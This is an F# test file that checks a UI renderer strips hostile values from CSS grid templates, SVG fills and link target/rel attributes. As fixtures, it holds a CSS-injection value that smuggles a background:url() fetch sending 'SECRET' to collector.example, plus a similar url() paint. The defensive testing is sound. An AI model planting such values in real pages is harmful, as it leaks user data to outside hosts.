module Fuaran.UI.Renderer.Server.Tests.EmissionGrammarRenderTests

// ============================================================================
//  The emission grammar for string-typed slots, at the render seam.
//
//  WHAT THIS CORPUS IS FOR. A handful of wire slots are typed `string` and
//  carry a grammar the type does not state — a CSS track-list
//  (`grid.templateColumns`), an SVG paint (`drawStyle.fill` / `.stroke`), a raw
//  theme CSS value, and the two anchor token slots (`link.target` /
//  `link.rel`). Until `Fuaran.UI.EmissionGrammar` those rules lived at each
//  emission site, per renderer, per arm, by hand, and the hosts DISAGREED:
//  this renderer concatenated `templateColumns` into
//  `style="grid-template-columns:…"` with no rule at all, so
//  `"1fr;background:url(https://collector/?d=…)"` closed the declaration,
//  opened a second one the document never wrote, and fetched on RENDER with no
//  user act — outside the egress policy that governs every `href` and `src` in
//  the same document — while the React client dropped the identical value
//  silently.
//
//  So the property under test is not "the renderer is strict". It is that a
//  string-typed slot's grammar is applied HERE, in emitted bytes, and that the
//  refusal is the one every other host makes.
//
//  Two disciplines, inherited deliberately from `EgressRenderTests`:
//
//   1. **Every refusal test has an ALLOW twin.** A gate that refuses everything
//      passes every refusal assertion ever written, so a corpus of refusals
//      alone cannot tell "the grammar works" from "the renderer is broken".
//      Each case below pins what still renders as well as what does not — and
//      the allow twins are the ones that go red if the grammar is tightened
//      past what a legitimate document says.
//
//   2. **The rendered bytes, through an ORDINARY entry point.** Every test
//      renders with `Render.render`, never with a seam function called
//      directly: a test that called `Sanitize.sanitizeCssValue` and asserted on
//      its result would keep passing on the day someone removed the call from
//      the grid arm, which is precisely the failure this phase closes.
// ============================================================================

open Expecto
open Fuaran.UI
open Fuaran.UI.Types
open Fuaran.UI.Renderer
open Fuaran.UI.Renderer.Server

let private contains (needle: string) (haystack: string) =
    haystack.Contains(needle, System.StringComparison.Ordinal)

/// The finding's own payload: a track-list that leaves its declaration and
/// fetches. Every character in it is individually innocuous, which is why a
/// character denylist rather than a validity check is what catches it.
let private hostileTemplate =
    "1fr;background:url(https://collector.example/?d=SECRET)"

let private gridWith (template: string) : Node<obj> =
    Fuaran.gridLayoutTemplated
        "g"
        template
        { Cols = 2
          TemplateColumns = Option.None
          Children = [ Fuaran.markdown "t" "cell" ] }

let private linkWith (target: string option) (rel: string option) : Node<obj> =
    let n = Fuaran.link "lk" "/about" "About us"

    match n.Kind with
    | NodeKind.Link spec ->
        { n with
            Kind = NodeKind.Link { spec with Target = target; Rel = rel } }
    | _ -> n

let private paintedCircle (fill: string) : Node<obj> =
    Fuaran.drawingSpec
        "d"
        { Defaults.drawing with
            Shapes =
                [ Shape.Circle(
                      5.0,
                      5.0,
                      2.0,
                      { Defaults.drawStyle with
                          Fill = Some(Binding.Static(Some fill)) }
                  ) ] }

[<Tests>]
let emissionGrammarRenderTests =
    testList
        "Phase 1523 — the emission grammar for string-typed slots, in emitted bytes"
        [

          // ─── CSS track-list ───────────────────────────────────────────────

          test "a hostile templateColumns emits an EMPTY value, not the declaration it wrote" {
              let html = Render.render BindingResolver.empty (gridWith hostileTemplate)

              Expect.isFalse
                  (contains "collector.example" html)
                  "the fetch the value smuggled in does not reach the document"

              Expect.isFalse (contains "SECRET" html) "and neither does what it was carrying"

              Expect.isTrue
                  (contains "grid-template-columns:\"" html
                   || contains "grid-template-columns:;" html
                   || contains "grid-template-columns:" html)
                  "the declaration is still emitted — with nothing in it, so the stylesheet's own rule applies"
          }

          test "the refusal is MARKED, naming the slot and never the value" {
              let html = Render.render BindingResolver.empty (gridWith hostileTemplate)

              Expect.isTrue
                  (contains Sanitize.cssRefusalAttribute html)
                  "the refusal carries its data attribute, so it is visible in the document"

              Expect.isTrue (contains "grid-template-columns" html) "and the marker names the slot"

              // Same bound every other denial in this codebase keeps: a refused
              // value IS the payload, so it is named by slot and never quoted.
              Expect.isFalse (contains "url(" html) "the marker does not quote the refused value back"
          }

          test "ALLOW twin — a real track-list renders verbatim and carries no marker" {
              // If this fails the grammar has become unusable rather than
              // strict, and every irregular grid in the estate is broken.
              let html = Render.render BindingResolver.empty (gridWith "1fr 2fr auto")

              Expect.isTrue (contains "grid-template-columns:1fr 2fr auto" html) "the author's value is untouched"
              Expect.isFalse (contains Sanitize.cssRefusalAttribute html) "and nothing is marked"
          }

          test "ALLOW twin — repeat() and minmax() survive, because `(` is not the rule" {
              let html =
                  Render.render BindingResolver.empty (gridWith "repeat(auto-fit, minmax(150px, 1fr))")

              Expect.isTrue
                  (contains "grid-template-columns:repeat(auto-fit, minmax(150px, 1fr))" html)
                  "the functional forms are what the escape hatch exists for"

              Expect.isFalse (contains Sanitize.cssRefusalAttribute html) "and are not marked"
          }

          test "the default grid — no templateColumns at all — is byte-identical to the pre-phase emission" {
              // The gate must be invisible where nothing declared anything. This
              // is the test that fails if `sanitizeCssValueForSlot` ever starts
              // rewriting rather than passing through.
              let html =
                  Render.render
                      BindingResolver.empty
                      (Fuaran.gridLayout
                          "g"
                          { Cols = 3
                            TemplateColumns = Option.None
                            Children = [ Fuaran.markdown "t" "cell" ] })

              Expect.isTrue (contains "grid-template-columns:repeat(3, 1fr)" html) "the computed default is unchanged"
              Expect.isFalse (contains Sanitize.cssRefusalAttribute html) "and unmarked"
          }

          // ─── SVG paint ────────────────────────────────────────────────────

          test "a url() paint emits `none` — the finding a character denylist cannot catch" {
              // `url(https://collector/x)` contains no forbidden CHARACTER, so
              // it passes the generic CSS rule. In an SVG `fill` it names a
              // paint server the user agent fetches. Only a positive grammar
              // excludes it, which is why the paint slots have one.
              let html =
                  Render.render BindingResolver.empty (paintedCircle "url(https://collector.example/x)")

              Expect.isFalse (contains "collector.example" html) "no paint server reference reaches the document"
              Expect.isTrue (contains "fill=\"none\"" html) "the shape is unpainted rather than differently painted"
          }

          test "ALLOW twin — hex, a named colour and a colour function all render verbatim" {
              // The named colour is the load-bearing one. An enumerated keyword
              // list refuses `steelblue`, and its failure mode is silent: the
              // shape is repainted, not reported. A document that was correct
              // yesterday must still be correct.
              for paint in [ "#39c"; "#336699"; "steelblue"; "currentColor"; "rgb(1 2 3)" ] do
                  let html = Render.render BindingResolver.empty (paintedCircle paint)

                  Expect.isTrue (contains (sprintf "fill=\"%s\"" paint) html) (sprintf "'%s' is a colour" paint)
          }

          // ─── Anchor token slots ───────────────────────────────────────────

          test "`rel=opener` on a `_blank` link is dropped and the safe pair is FORCED" {
              // The whole finding in one assertion. `opener` re-enables
              // `window.opener` on a `_blank` link, handing the opened document
              // a live reference to this one — and browsers imply `noopener`
              // there, which is exactly why an explicit `opener` mattered: it
              // OVERRIDES a user-agent default no document can know the version
              // floor of.
              let html =
                  Render.render BindingResolver.empty (linkWith (Some "_blank") (Some "opener"))

              Expect.isFalse (contains "opener\"" html && not (contains "noopener" html)) "`opener` is not emitted"

              Expect.isTrue
                  (contains "rel=\"noopener noreferrer\"" html)
                  "and the pair is emitted whether or not the document asked"

              Expect.isTrue (contains "target=\"_blank\"" html) "the target itself is legitimate and survives"
          }

          test "a named frame target is dropped — the attribute is OMITTED, not substituted" {
              // Omitting says truthfully that the document declared nothing this
              // renderer could honour. Substituting `_self` would put a value in
              // the DOM the author never wrote, and the two are the same
              // navigation anyway.
              let html =
                  Render.render BindingResolver.empty (linkWith (Some "victim") Option.None)

              Expect.isFalse (contains "target=" html) "no target attribute at all"
              Expect.isFalse (contains "victim" html) "and the frame name is not in the document"
          }

          test "`_parent` and `_top` are dropped — a framed document does not navigate its embedder" {
              for t in [ "_parent"; "_top" ] do
                  let html = Render.render BindingResolver.empty (linkWith (Some t) Option.None)
                  Expect.isFalse (contains "target=" html) (sprintf "'%s' is not honoured" t)
          }

          test "ALLOW twin — `_self` with a descriptive rel renders both, and forces nothing" {
              let html =
                  Render.render BindingResolver.empty (linkWith (Some "_self") (Some "nofollow"))

              Expect.isTrue (contains "target=\"_self\"" html) "the target survives"
              Expect.isTrue (contains "rel=\"nofollow\"" html) "the token survives"
              Expect.isFalse (contains "noopener" html) "and nothing is forced on a same-tab link"
          }

          test "a link declaring NEITHER slot emits neither attribute — unchanged from before the phase" {
              let html = Render.render BindingResolver.empty (linkWith Option.None Option.None)

              Expect.isFalse (contains "rel=" html) "no rel"
              Expect.isFalse (contains "target=" html) "no target"
          }

          // ─── The go-red self-test ─────────────────────────────────────────

          test "GO-RED — the grammar itself refuses and admits the right things" {
              // Without this, a bug that made every CSS value empty for an
              // unrelated reason would read above as a gate working. These
              // assertions fail if the rule is inverted, vacuous, or absent.
              Expect.isFalse (Sanitize.isSafeCssValue hostileTemplate) "the hostile value is refused by the rule"
              Expect.isTrue (Sanitize.isSafeCssValue "1fr 2fr auto") "a real track list is not"

              Expect.isTrue
                  (Sanitize.isSafeCssValue "clamp(1rem, 2vw, 3rem)")
                  "and neither is a function the denylist does not name"

              Expect.equal
                  (Sanitize.sanitizeCssValue "a}b{color:red")
                  ""
                  "a brace-bearing value cannot reach a stylesheet"

              Expect.equal (Sanitize.sanitizePaintValue "url(#grad)") "none" "a local paint server is refused too"

              Expect.equal
                  (Sanitize.sanitizeLinkAnchor (Some "_blank") Option.None)
                  (Some "_blank", Some "noopener noreferrer")
                  "the pair is forced even with no declared rel at all"
          } ]
